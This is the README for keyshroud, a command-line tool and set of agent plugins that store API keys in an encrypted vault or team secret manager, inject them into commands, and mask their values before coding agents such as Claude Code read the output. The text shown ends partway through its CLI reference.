<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**Your agents use the keys. They never see them.**

**Keep API keys out of Claude Code, Codex, Cursor, Cline, OpenCode, Gemini CLI, pi and omp** —
secrets stay in an encrypted vault on your machine (or in your own
[Vaultwarden](https://github.com/dani-garcia/vaultwarden) or Bitwarden, to share them between
machines, or in the secret manager your team already runs: HashiCorp Vault, OpenBao, Infisical,
1Password, AWS, Google Cloud, Azure), and every value is masked before the model reads it.

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json)

[🚀 Quickstart](#quickstart) · [🔐 Local vault](#the-local-vault) · [🔄 Sync with Vaultwarden](#sync-across-machines-vaultwarden-or-bitwarden) · [🏢 Team secret managers](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure) · [🔌 Supported agents](#supported-agents) · [⚙️ How it works](#how-it-works) · [❓ FAQ](#faq) · [🛡️ Security model](#security-model) · [🌐 Website](https://keyshroud.dev)

[🇻🇳 Tiếng Việt](i18n/README.vi.md) · [🇨🇳 简体中文](i18n/README.zh-CN.md) · [🇯🇵 日本語](i18n/README.ja-JP.md)

</div>

<p align="center"><img src="assets/demo.gif" alt="Demo: on a new machine, keyshroud add stores a GitHub token in the local vault through a masked prompt, keyshroud run masks it in the command's output, and scan finds a copy leaked into a file" width="860"></p>

```console
$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

The command got the real token. The transcript — and the model reading it — got
`<redacted:GH_TOKEN>`. (Masking is automatic when an agent runs the command;
`--mask` forces it in a human terminal.)

## Why keyshroud?

Coding agents need credentials to do real work: `gh`, `npm publish`, cloud CLIs,
webhooks, databases. The usual options are bad:

- ❌ **Paste the key into the chat** — now it is in the transcript, the provider's logs, and every future context window
- ❌ **Put it in `.env`** — the agent `cat`s it while debugging, or commits it
- ❌ **Pay for a secrets manager** — `op run` needs a 1Password subscription, and most "agent vaults" are hosted SaaS
- ❌ **Use a vault MCP server** — most of them return the plaintext value straight to the model

**keyshroud fixes this:**

- ✅ **Names, not values** — agents see `GH_TOKEN` and `keyshroud://GitHub token`, never the token
- ✅ **Masked output** — any value that reaches stdout/stderr becomes `<redacted:GH_TOKEN>`
- ✅ **Nothing to set up** — an encrypted vault file with its key in your OS keychain; no account, no server
- ✅ **Sync if you want it** — Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, for several machines
- ✅ **Works with what your team has** — reads HashiCorp Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud and Azure, and never writes there
- ✅ **Free** — MIT-licensed, no telemetry

## Features

| | |
|---|---|
| 🙈 **Masked output** | `keyshroud run` replaces every secret value in stdout/stderr with `<redacted:NAME>` — streaming-safe across chunk boundaries. |
| 🔐 **Local vault** | An AES-256-GCM file whose key is in the macOS keychain, the Linux Secret Service or Windows DPAPI (a passphrase where there is none). No account, no server, no `bw`. |
| 🪝 **Agent hooks** | The pi/omp `tool_result` hook redacts every tool result, failed ones included. Claude Code's `PostToolUse` hook redacts every *successful* tool result (Bash, Read, Grep, MCP…), and [`keyshroud claude-guard`](#claude-code) masks what a Bash command prints as it is written, failed commands included — see [limits](#security-model). |
| 🔌 **MCP server** | For clients without a shell: `keyshroud mcp` gives them `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`. No tool ever returns a value. |
| 🔗 **Committable references** | `keyshroud://item`, `bw://item`, `bw://item/username`, `bw://item/fields/name`, `bw://item/totp` in `.env.refs` files and templates: names, not values. |
| ⌨️ **Paste-to-create** | New secrets go through a masked prompt in the user's terminal or a masked popup in pi — never through the chat. |
| 📄 **`inject`** | Render `{{ keyshroud://… }}` and `{{ bw://… }}` templates into `0600` config files for tools that can't read env vars (`.npmrc`, kubeconfig). |
| 🔎 **`scan`** | Find vault values that leaked into your working tree (pre-commit friendly): text files up to 2 MB, not `.git`, `node_modules`, `dist`, `.next`, `.venv` or links. |
| ⚡ **Fast** | The local vault answers in milliseconds, offline. With Vaultwarden: one batched `bw list items` per session instead of one `bw get` (~3 s) per secret. |
| 🔄 **Optional sync** | Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, when the same secrets should reach several machines. `keyshroud://` and `bw://` references work side by side. |
| 🏢 **Team secret managers** | `vault://secret/app#password`, `infisical://…`, `op://…`, `awssecrets://…`, `awsssm://…`, `gcpsecrets://…`, `azurekeyvault://…`: read-only [sources](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure), injected and masked like any other secret. |
| 🎯 **Project scope** | A `.keyshroud.json` in a repo (`{ "only": ["STRIPE_*", "GH_TOKEN"] }`) narrows what `run`, `env` and the agents get there to the names that project needs; masking still covers every value. |
| 💾 **Backup** | `keyshroud backup` copies the local vault into one file under a passphrase of its own; `keyshroud restore` brings it back on any machine and wires the names again. |
| 🧾 **Audit log** | `audit.jsonl` records which *names* were used, when, by which command. Never values. |

## Supported agents

| Agent | Install | What you get |
|---|---|---|
| **Claude Code** | [plugin](#claude-code) | SessionStart + PostToolUse redaction hooks, skill |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | env hydration, `tool_result` redaction (failed calls too), `/secret` |
| **Codex, OpenCode, Gemini CLI, Cursor agent** | [`npx skills add dinhkarate/keyshroud`](#other-agents-with-a-shell) | skill + CLI with masked output |
| **Claude Desktop, chat-only clients** | [`mcpServers` JSON](#mcp-clients-without-a-shell) | MCP tools with masked output |
| **Any shell or CI** | `keyshroud run -- <cmd>` | env injection + masked output |

Agents with a shell use the CLI: it costs no tool schemas in the context, and
`keyshroud run` masks output whatever the exit code. The MCP server is for
clients that cannot run commands.

## Use cases

**"Claude Code keeps reading my `.env`."** Run `keyshroud import` to move the values into
the vault and write a `.env.refs` file with lines like `GH_TOKEN=keyshroud://myapp GH_TOKEN`, then start
the agent with `keyshroud run --env-file .env.refs -- claude`. The plugin's hooks mask anything that still slips into a tool result.

**"I already self-host Vaultwarden."** Log `bw` in to it and run `keyshroud doctor`: a machine with
a `bw` login keeps Vaultwarden as the default, and keyshroud adds no server of its own.

**"My company keeps its secrets in HashiCorp Vault."** `keyshroud source add vault --addr https://vault.example.com`
once, then `DB_PASSWORD=vault://secret/myapp/db#password` in `.env.refs` (or `keyshroud wire`). The agent
runs `keyshroud run -- …` and sees the name; the value is read from Vault and masked in the output.
The same goes for [OpenBao, Infisical, 1Password, AWS, Google Cloud and Azure](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure).

**"I like `op run` but don't want 1Password."** `keyshroud run` is the same idea —
references in, masked output out — with the vault on your machine or on a server you host.

**"My agent needs to add a new key."** It runs `keyshroud add` or calls `secrets_request` (MCP),
and a hidden-input dialog pops up on your desktop; in pi it is `/secret`. You paste the value
there. It never enters the chat.

## Quickstart

**Requirements:** Node.js ≥ 18.19. Nothing else: no account, no server.

```bash
npm install -g keyshroud

# 1. Store a secret — typed into a masked prompt, never echoed.
#    The first one creates the local vault.
keyshroud add --env GH_TOKEN --item "GitHub token"

# 2. Use it
keyshroud run -- gh auth status
keyshroud run -- claude          # start an agent with every wired secret available

# 3. Check everything
keyshroud doctor
```

```console
$ keyshroud add --env GH_TOKEN --item "GitHub token"
Paste secret for GH_TOKEN: ****************************************
keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking.
created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes
```

Without a terminal (an agent's shell), `add` opens a hidden-input dialog on your desktop instead,
so an agent can start it and you only paste. Already have a `.env`? `keyshroud import` moves it.

### The local vault

`~/.config/keyshroud/vault.json` holds every item, encrypted with AES-256-GCM under one random
256-bit key. Item names are encrypted too; the file is `0600`. Where the key lives depends on the machine:

| Machine | Key | Unlocking |
|---|---|---|
| macOS | login keychain, entry `keyshroud-vault-<id>` | none |
| macOS with `KEYSHROUD_VAULT_KEY=secure-enclave` (or `keyshroud rekey --to secure-enclave`) | wrapped to a key in the Mac's Secure Enclave | Touch ID (or the Mac's password) when a command needs a secret; a session ends after 30 minutes |
| Linux with a desktop keyring and systemd | Secret Service (`secret-tool`; found with `busctl`) | none |
| Windows | DPAPI, bound to your Windows account | none |
| Docker, servers, SSH with a locked keyring, Linux without systemd | derived from a passphrase (scrypt) | `keyshroud unlock`; a session ends after 30 minutes |

The key mode is chosen once, when the vault is created. To be asked for a passphrase on any machine,
create it with `KEYSHROUD_VAULT_KEY=passphrase keyshroud unlock` in a terminal (typed twice, at least
12 characters). When a session has ended, a command that needs a secret asks again: a masked prompt in
a terminal, a dialog on the desktop, and over SSH it tells you to run `keyshroud unlock`.

A Touch ID vault needs the Xcode Command Line Tools once (`xcode-select --install`): keyshroud builds
a small helper from `src/touchid.swift` on first use, which takes a few seconds. The sheet appears for
any caller that may ask (the CLI, `secrets_run`, Claude Code's apiKeyHelper); for this vault hooks,
`status` and `doctor` never ask (with Vaultwarden they renew a session from a stored master
password, which asks if you set that keychain entry to ask, and after bw has logged itself out they
log in again once you approve a Touch ID sheet), and over SSH it tells you to run `keyshroud unlock` at the Mac. `keyshroud rekey`
moves a vault between key types (a new key and vault id each time); run `rekey --to passphrase` before
moving to another Mac.

Nothing can recover a lost key or a forgotten passphrase, and the vault belongs to one machine:
`vault.json` copied elsewhere does not open without its key, which stays in this machine's key store.

### Backup and restore

```bash
keyshroud backup                           # asks for a new passphrase, writes ./keyshroud-backup-<date>.json
keyshroud restore keyshroud-backup-….json  # what it would add; --yes does it
```

`backup` (in a terminal) copies every item of the local vault into one file in the vault's own format,
sealed under a passphrase you choose now (at least 12 characters, typed twice), not under this
machine's key: it opens anywhere. It first proves the vault's current key the way `rekey` does (a
passphrase vault asks for its passphrase, a Touch ID vault for Touch ID; an open session is not enough),
never writes over a file that is there (`--out FILE` names another), and the file is `0600`. Keep it
somewhere that is not this machine. Nothing can recover its passphrase.

`restore FILE` (in a terminal) asks for that passphrase and prints a plan of names: items the local
vault lacks are added, items it holds with the same value are left alone, and an item that has another
value here is kept as it is unless you add `--replace`. Nothing changes until `--yes`. The variable an
item was stored for (`add --env NAME`) is wired to it again when nothing is wired under that name, so
on a new machine `keyshroud restore FILE --yes` is the whole move; the vault it creates there gets
that machine's own key. Items in Vaultwarden, the servers of the sources and their sign-ins are not
part of a backup. For the same secrets on several machines at once, use Vaultwarden or Bitwarden.

### Sync across machines: Vaultwarden or Bitwarden

Keep the secrets in Vaultwarden or Bitwarden instead to have them on several machines; `run`, the
hooks, the MCP server and everything else work the same, through the Bitwarden CLI.

**Get a vault** — pick one:

- **Self-host Vaultwarden** (free, your server): follow
  [examples/vaultwarden](examples/vaultwarden#readme) — Docker Compose + Caddy with automatic HTTPS,
  from an empty VPS to `keyshroud doctor`, plus backups and hardening.
- **Bitwarden cloud** (free account, no server): sign up at [bitwarden.com](https://bitwarden.com)
  and skip `bw config server` below (EU accounts: `bw config server https://vault.bitwarden.eu`).

```bash
npm install -g @bitwarden/cli

# 1. Point bw at your server and log in once
bw config server https://vault.example.com
bw login

# 2. Make it the default for new items (keyshroud:// items keep working)
mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend

# 3. Unlock for 30 minutes (asks for the master password, which is not stored)
keyshroud unlock

# 4. Check everything
keyshroud doctor
```

keyshroud picks the default once per machine and writes it to `~/.config/keyshroud/backend`:
Vaultwarden when it finds a `bw` login or anything keyshroud 0.7 left behind, so upgrades change
nothing; the local vault otherwise. `KEYSHROUD_BACKEND=local|bw` overrides it, and `keyshroud setup`
switches to Vaultwarden by itself. References name their vault, so `keyshroud://…` and `bw://…` items work
side by side, and `--item keyshroud://Name` or `--item bw://Name` picks one for a single item.

keyshroud never stores the master password unless you do. When Vaultwarden is locked
and a command needs a secret, it asks: a masked prompt in a terminal, a native dialog
on the desktop (so an agent's command waits for you), and over SSH it tells you to run
`keyshroud unlock`. A session ends after 30 minutes (`KEYSHROUD_SESSION_TTL_MS`): a timer
runs `bw lock`, so a copied session token stops working too. On a host nobody sits at,
`keyshroud unlock --unattended` asks once, in a terminal only, and opens a session without an end.

To unlock without being asked, store the master password in the OS keychain
(`security add-generic-password -a "$USER" -s vaultwarden-master-password -w`, or
`secret-tool store` on Linux; after `setup` the entry is `keyshroud-master-password`; see the
[vault setup guide](examples/vaultwarden#optional-unlock-without-being-asked)). Any program running
as you can then read it, agents included. Windows has no keychain support for it.

### Least privilege: a separate agent account

With the steps above, an unlocked session opens your whole Vaultwarden vault, and an agent that
runs `bw` as you can use it. `setup` gives keyshroud its own `bw` login on a dedicated
account instead, which holds only the secrets agents need:

```bash
keyshroud setup --email you+agent@example.com   # opens the signup page, then logs in with the
                                                 # new master password (asked, not stored);
                                                 # no `bw config server`: Bitwarden cloud
keyshroud migrate                                # dry run: which wired items would be copied
keyshroud migrate --yes                          # copy them; references keep working
```

- The agent login lives in `~/.config/keyshroud/bw` (`BITWARDENCLI_APPDATA_DIR`). Your own `bw`
  login is untouched. Its master password is not stored: keyshroud asks for it when a session
  ends and keeps only a scrypt hash, so `add` can refuse it as a secret.
- `migrate` copies the items that wired names (and any `--env-file` / `--item`) reference, with
  the same names, then locks your personal vault again. Originals stay where they are. It asks
  for your personal master password in a terminal (or reads the keychain entry `vaultwarden-master-password`).
- An agent can run `setup` too. Without a terminal it opens the signup page, where you pick the
  agent account's master password yourself (save it in your password manager); then the agent
  runs `setup --registered`, which asks for it in a dialog. The password never passes through
  anything the agent can read. `--confirm-unlock` and `--unattended` need a terminal.
- `--confirm-unlock` (macOS) stores the master password in the keychain entry
  `keyshroud-master-password` so that macOS asks you before every read, i.e. every unlock.
- If bw loses the login (a rejected refresh token logs it out), keyshroud on a Mac with the
  master password in the keychain asks for Touch ID and logs the agent account back in.
- `--unattended` (hosts nobody sits at, e.g. over `ssh -t`) logs in with a session without an
  end. Unlock it again with `keyshroud unlock --unattended`.
- Self-hosted Vaultwarden with `SIGNUPS_ALLOWED=false`: invite the address from the admin page
  (`/admin`), or allow signups for a minute, then pass `--registered` once the account exists.

### Least privilege: a project's own names

By default `keyshroud run` puts every wired secret into the command, so an agent working on one
project can use the tokens of all the others. A scope narrows that for a directory:

```bash
cd ~/code/shop
keyshroud scope --only 'STRIPE_*,GH_TOKEN'   # writes ./.keyshroud.json
keyshroud scope                              # what is in scope here, and how many names are not
```

```json
{ "only": ["STRIPE_*", "GH_TOKEN"] }
```

In that directory and below it (the nearest `.keyshroud.json` going up decides):

- `keyshroud run`, `secrets_run`, `env`, `env --shell` and pi/omp's shell get only the names in
  scope; `run` and `secrets_run` do not pass a wired name outside it on, not even from the
  environment the agent was started with.
- `run --only NAME`, `get NAME` and `secrets_run` with `only` refuse a name outside the scope, and
  say so.
- The names Claude Code is told at session start, and `secrets_list`, are the ones in scope.
- Masking is not narrowed: a value outside the scope that turns up in output is still masked (a
  name wired to a [team secret manager](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure)
  from the moment its value has been read there: masking never contacts a source by itself).
- `secrets_run` takes the scope of the directory its command runs in (`cwd`; through a link, the
  directory it leads to), `secrets_list` the one of the directory the MCP server was started in.
- `add` and `wire` say when the name they just wired is outside the scope, so you can add it there.

The file holds names and patterns only (`*` stands for any run of characters), so it can be committed;
a teammate's machine applies it to whatever they have wired under those names. A file that cannot be
read as a scope (also a link to a file that is gone) puts nothing in scope and says why, instead of
falling back to everything or to a scope further up. References
(`--env-file .env.refs`, `get keyshroud://Item`) are not narrowed: they already name what they want.
A scope is a default against accidents, not a wall: see the [security model](#security-model).

### Team secret managers: Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud, Azure

A company usually has a secret manager already. keyshroud reads from it and never writes there, so a
secret kept in HashiCorp Vault reaches a command the way a local one does: by name, with its value
masked in the output. These are *sources*: a reference says which secret, and nothing is copied into
keyshroud's vault.

```bash
# HashiCorp Vault or OpenBao: name the server once
keyshroud source add vault --addr https://vault.example.com    # reads with the token of `vault login`

# then wire a name to a secret there, or put the reference in .env.refs
keyshroud wire --env DB_PASSWORD --item 'vault://secret/myapp/db#password'
keyshroud run --only DB_PASSWORD -- ./migrate.sh
```

```dotenv
# .env.refs: safe to commit, names only
DB_PASSWORD=vault://secret/myapp/db#password
STRIPE_KEY=awssecrets://prod/stripe#api_key
SENTRY_DSN=op://Engineering/Sentry/dsn
```

| System | Reference | Signs in with | Tested against |
|---|---|---|---|
| HashiCorp Vault, OpenBao (KV v1 and v2) | `vault://<mount>/<path>#<field>` | `source add vault`: the token of `vault login`, a token, or AppRole | real servers in CI: Vault 2.2.2, OpenBao 2.7.2 (namespaces on OpenBao) |
| Infisical (cloud or self-hosted) | `infisical://<project id>/<environment>/[<folder>/]<NAME>` | `source add infisical`: a machine identity (Universal Auth) | a real self-hosted server in CI (0.167.10) |
| AWS Secrets Manager | `awssecrets://<name or ARN>[?region=R][#<json key>]` | your `aws` CLI | the real `aws` CLI against the moto emulator, in CI |
| AWS SSM Parameter Store | `awsssm://<parameter>[?region=R]` (`awsssm:///prod/db` is `/prod/db`) | your `aws` CLI | same |
| 1Password | `op://<vault>/<item>/[<section>/]<field>`, as 1Password writes it | your `op` CLI | a stand-in `op`: the command line from 1Password's documentation |
| Google Cloud Secret Manager | `gcpsecrets://<project>/<secret>[?version=N][#<json key>]` | your `gcloud` CLI | a stand-in `gcloud`, likewise |
| Azure Key Vault | `azurekeyvault://<vault name>/<secret>[/<version>][#<json key>]` | your `az` CLI | a stand-in `az`, likewise |

The last three have no open-source server to test against, so only the command keyshroud runs is
checked; tell us in an issue if one misbehaves on a real account.

**Vault and OpenBao.** `source add vault` takes `--addr` (or `VAULT_ADDR` / `BAO_ADDR` as it is set when
you run it), `--namespace` (`VAULT_NAMESPACE`) and `--ca-file` (`VAULT_CACERT`, a PEM file for a private
CA), checks that the server accepts the sign-in, and writes them to `~/.config/keyshroud/sources.json`.
Three ways to sign in:

- nothing more: the token `vault login` (or `bao login`) left in `~/.vault-token`, so OIDC, LDAP or
  whatever your team uses to log in keeps working and keyshroud stores no credential;
- `--token`: asks for a token (masked prompt, dialog or `--stdin`) and keeps it in keyshroud's vault as the item `Source vault token`;
- `--role-id ID`: AppRole, for machines and CI. Asks for the secret id, keeps it as the item
  `Source vault secret id`, and logs in at `auth/approle` when a secret is needed.

`#field` picks one field of the secret; without it, a secret with a single field gives that field, and
one with several is an error that lists the field names. The mount may be several segments deep
(`vault://team/kv/app#key`): keyshroud asks the server where the mount ends and whether it is KV v1 or v2,
and reads only KV mounts.

**Infisical.** `keyshroud source add infisical --client-id ID` (add `--addr` for a self-hosted server)
asks for the machine identity's client secret and keeps it as the item `Source infisical client secret`.
The project id is the one in the project's settings; `infisical://<id>/prod/STRIPE_KEY` is at the root
folder, `infisical://<id>/prod/payments/STRIPE_KEY` in `/payments`.

**1Password, AWS, Google Cloud, Azure.** Nothing to set up in keyshroud: it runs the vendor's CLI
(`op read`, `aws secretsmanager get-secret-value`, `aws ssm get-parameter --with-decryption`,
`gcloud secrets versions access`, `az keyvault secret show`) with the sign-in that CLI already has
(profile, SSO, service account, `OP_SERVICE_ACCOUNT_TOKEN`). `#key` picks one key of a secret that is a
JSON document. `keyshroud source` lists what is set up and which of these CLIs it found.

What holds for all of them:

- **Read-only.** `add`, `rotate` and `rm` refuse a source reference; keyshroud has no code that writes to a source.
- **A reference never names a server.** For Vault, OpenBao and Infisical the address comes from
  `source add`, so a `.env.refs` in a cloned repository cannot send your token somewhere else;
  `?address=…` and other parameters a reference does not know are refused. A vendor's CLI goes by its
  own configuration (profile, endpoint, proxy), of which a reference can pick only the AWS `?region=`.
- **HTTPS only** for Vault, OpenBao and Infisical, except `http://` on localhost for a dev server.
  The certificate is always checked (there is no option to skip it, and `NODE_TLS_REJECT_UNAUTHORIZED=0`
  does not reach it), and redirects are not followed.
- **Errors in keyshroud's own words.** What a server or a vendor's CLI says when it fails is not
  passed on (it could repeat a token or a secret): you get the HTTP status (`HTTP 403 (not allowed)`),
  or which kind of failure it was (`aws is not signed in`, `aws was refused access`,
  `aws found no such secret`). For the full message, run the vendor's CLI yourself in a terminal.
- **Credentials stay in keyshroud's vault** and are masked like any other value, as are the tokens a
  login returns (`<redacted:VAULT_SOURCE_TOKEN>`, `<redacted:INFISICAL_SOURCE_TOKEN>`).
- **Values are not stored**, only kept in memory by a long-running process (the pi extension, the MCP
  server) for at most `KEYSHROUD_CACHE_TTL_MS` (`0`: not at all), 256 references at a time. Each
  `keyshroud run` reads them again. A value is passed on as the source stores it, a line break at its
  end included (store with `echo -n`, or `printf`).
- `keyshroud source rm vault|infisical` forgets the server; the credential item stays until you `keyshroud rm` it.

Not built in yet: Doppler, Bitwarden Secrets Manager, CyberArk Conjur, Akeyless, Vault auth methods
other than token and AppRole, and Vault's dynamic secrets (database, AWS, PKI engines).

## How it works

```
              ┌──────────────────────────── your machine ─────────────────────────────┐
              │  vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase   │
              │      │                                                                │
              │      ▼                                                                │
 Vaultwarden ◄┼─bw─ keyshroud ── resolves keyshroud:// and bw:// refs ──► command's env   │
 (optional)   │      ▲                                                   │            │
              │      └──── redactor ◄──── stdout / stderr ◄──────────────┘            │
              │                │ <redacted:NAME>                                      │
              └────────────────┼──────────────────────────────────────────────────────┘
                               ▼
                  agent transcript / LLM provider
```

1. **Wiring.** A secret is wired by *name*: `GH_TOKEN → keyshroud://GitHub token` (or
   `bw://GitHub CLI token`). Wiring lives in `~/.config/keyshroud/env.json` and in project `.env.refs`
   files. When pi or omp is installed (`~/.pi/agent`, `~/.omp/agent` exists), a name is also
   written to its `auth.json`, where pi/omp run the `!keyshroud get '…'` entries on their own
   (`--target pi|omp|both` writes there in any case). keyshroud writes only names and references to
   these files, so what it wrote is safe to read. A key that you or pi put into `auth.json` as plain
   text is still there: keyshroud masks it in output like a vault value, but cannot take it out of
   the file. Every reference in these files is masked as well, whatever a command injects of it
   (a `bw://` one when the command has the bw vault open already: keyshroud does not unlock bw,
   renew its session or ask for one for a value nobody asked for). An entry that cannot be read
   is left out by itself.
2. **Unlock.** The local vault's key comes from the OS keychain, or from a passphrase session that
   ends after 30 minutes. Vaultwarden: keyshroud asks for the master password (or reads one you
   stored in the OS keychain); the session token is cached in `~/.config/keyshroud/session`
   (`0600`) and locked again after 30 minutes.
3. **Resolve.** `keyshroud://` references are read from the vault file; `bw://` references resolve
   from one `bw list items` snapshot held in memory for `KEYSHROUD_CACHE_TTL_MS` (default 1 h).
4. **Inject.** Values go into the child process environment — never into argv
   or tool results (`inject` writes `0600` files only when you ask it to).
5. **Redact.** In-process (`run`, MCP, pi/omp) output passes through a redactor
   that knows every wired value, the session token or vault key, and every value in
   the vault. Out-of-process Claude Code hooks use a keyed-HMAC
   fingerprint index (`redact-index.json`, `0600`) of wired values, values you
   printed with `get`, `inject` or `api-key`, and the session token or key only,
   so they never hold plaintext or fingerprint the rest of your vault.

## Claude Code

Install the CLI, then the plugin (redaction hooks + skill):

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

What you get:

- **SessionStart hook** — refreshes the redaction index and tells Claude which
  secret *names* exist. It never asks for a master password or passphrase: with a
  locked vault it tells Claude to ask you to run `keyshroud unlock`.
- **PostToolUse hook** — rewrites any successful tool result that contains a
  wired value or the vault session token to `<redacted:NAME>` using Claude
  Code's `updatedToolOutput` (tested with Claude Code 2.1.296).
  **Limit:** when a command fails, Claude Code fires `PostToolUseFailure`, which
  cannot rewrite output. The skill and session context therefore tell Claude to
  run every secret-using command through `keyshroud run`, which masks inside
  the process regardless of the exit code; the guard below covers the commands
  that are not run that way.
- **Skill** — teaches Claude to use names and references, never values.

Claude uses the CLI from its Bash tool, so the plugin adds no MCP server (since
0.6.1). To add one anyway: `claude mcp add keyshroud -- keyshroud mcp`.

The plugin calls `keyshroud` from `PATH`. If Claude Code is launched from a GUI
that doesn't see your npm/nvm bin directory, run `keyshroud link-cli` (links it
into `~/.local/bin`) and make sure that directory is on the GUI's `PATH`.

To give Bash commands the secrets as env vars, start Claude through keyshroud:

```bash
keyshroud run -- claude
```

Use a vault item as Claude Code's own API key (`apiKeyHelper`):

```bash
keyshroud claude-setup --item "Anthropic API key" --ttl-ms 600000
```

It backs up `settings.json` first and refuses to replace an existing helper
without `--force`.

### The guard: failed commands masked too

```bash
keyshroud claude-guard          # on (macOS, Linux); takes effect in new Claude Code sessions
keyshroud claude-guard --off
```

With the guard on, Claude Code starts its shell through keyshroud (`CLAUDE_CODE_SHELL` in
`~/.claude/settings.json` points at a small launcher in `~/.config/keyshroud/guard/`). Each Bash
command runs in your real bash or zsh with the same arguments; what it prints passes through a
masking process on its way to Claude Code, so a wired value becomes `<redacted:NAME>` whether the
command succeeds, fails or is interrupted, and whether or not it was run through `keyshroud run`.
The exit status, the order of stdout and stderr, the working directory and background jobs behave as
before; a command costs about 0.2 s more.

The guard knows values the way the hook does: from the fingerprint index, never from the vault, so it
never asks for anything and masks nothing before an index exists. It covers the Bash tool; the
`PostToolUse` hook stays on for the other tools. If its pipes or the masking process cannot be
started, the command is not run (exit 126, with the reason) rather than run unmasked; if the masking
process stops while a command runs, the shell and what it started are told to end, and killed after
two seconds. That is as good as the list of processes it can get: one that has cut itself loose from
the shell is not found, and if the list cannot be had at that moment the guard stops what it knows of
and says that the rest may still run (the list comes from `/proc` or the system's `ps`; a machine
with neither runs nothing through the guard). A value of
several lines that is printed with a pause between its lines is masked by its runs of 20 characters
or more only. `keyshroud doctor` shows `claude guard=on|off`; `--shell PATH` picks the bash or zsh it
stands in for (default: the one Claude Code was set to use, else your `$SHELL`), `--off` restores what
the setting was. The settings alone say whether the guard is on: a launcher looks there before each
command, so sessions that were started while it was on keep working after `--off` (their launcher then
only starts the shell), and mask again after `claude-guard`. If the settings cannot be read, the
launcher does not take that for off: the command is not run.

## pi / omp

```bash
pi install npm:keyshroud
```

The extension:

- hydrates wired secrets into the agent's environment before provider auth
  resolves, so `$CUSTOM_KEY` provider references work at startup;
- redacts every tool result, successful or failed, through the `tool_result`
  hook (wired values, the session token or vault key, and every password in the vault): its text,
  and the details and structured data a tool returns beside it. What a tool streams while it is
  still running is shown as it is; its result is masked;
- masks the output of a `!command` you type as it arrives, so the masked text is what pi shows,
  saves and later summarizes (through pi's own shell, the one your own pi settings name: a shell
  that only a project's settings name is not used for a masked `!command`; in a host
  without it, or when another extension runs your `!commands`, only what is sent to the model with
  a turn is masked). A value is masked before pi's environment holds it;
- with a passphrase vault, takes its values out of the agent's environment once the
  session ends or you run `keyshroud lock`, checked before every tool and `!command`;
- adds `/secret` (describe → confirm name → masked paste), `/vault_add`,
  `/vault_wire`, `/vault_rotate`, `/vault_status`, and the `vault_add_secret` /
  `vault_status` tools.

`/secret` can ask a local OpenAI-compatible model to propose the item and
variable names. Only your description is sent — never the value:

```bash
export KEYSHROUD_PLANNER_URL=http://127.0.0.1:8080/v1/chat/completions
export KEYSHROUD_PLANNER_MODEL=qwen3-4b
```

Without a planner, names are derived from the description and you can edit them.

## Other agents with a shell

Codex, OpenCode, Gemini CLI, Cursor's agent and anything else that can run commands: install the
CLI and the skill, which teaches the agent to run secret-using commands as `keyshroud run -- …`
and to store new secrets with `keyshroud add`:

```bash
npm install -g keyshroud
npx skills add dinhkarate/keyshroud
```

`npx skills` needs Node.js 22.20+. On an older Node, copy the skill that comes with the CLI;
Codex and OpenCode read `~/.agents/skills`:

```bash
mkdir -p ~/.agents/skills && cp -R "$(npm root -g)/keyshroud/skills/keyshroud" ~/.agents/skills/
```

## MCP clients without a shell

Claude Desktop, chat-only clients, or an agent you do not allow to run commands. Any client that
speaks MCP over stdio:

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

Codex, if you want MCP there too: `codex mcp add keyshroud -- keyshroud mcp`. Non-interactive `codex exec` refuses MCP calls that need approval; allow keyshroud's tools explicitly:

```toml
# ~/.codex/config.toml
[mcp_servers.keyshroud.tools.secrets_run]
approval_mode = "approve"
```

OpenCode: `opencode mcp add keyshroud -- keyshroud mcp`.

| Tool | Does | Returns |
|---|---|---|
| `secrets_list` | Lists wired names (+ optional `env_file`) | resolved / unresolved names |
| `secrets_run` | Runs a shell command with secrets injected (`only`, `env_file`, `cwd`, `timeout_ms`) | exit code + masked stdout/stderr |
| `secrets_request` | Opens a hidden-input dialog on the user's desktop and stores the value | `created … verified=yes`, or a `keyshroud add …` command for *their* terminal when no dialog can be shown |
| `vault_status` | Which vault, lock state, item count | status line |

## CLI reference

```text
keyshroud get <ENV_NAME | keyshroud://ref | bw://ref | source ref>   print one value (for scripts; not for agents)
keyshroud run [--env-file F]... [--only A,B] [--no-auth] [--mask|--no-mask] -- <cmd>
keyshroud inject [-i template] [-o out] [--force]
keyshroud redact < log.txt
keyshroud scan [paths...]
keyshroud env [--shell]
keyshroud scope [--only A,B_* | --clear]           this directory's .keyshroud.json: which wired names it gets
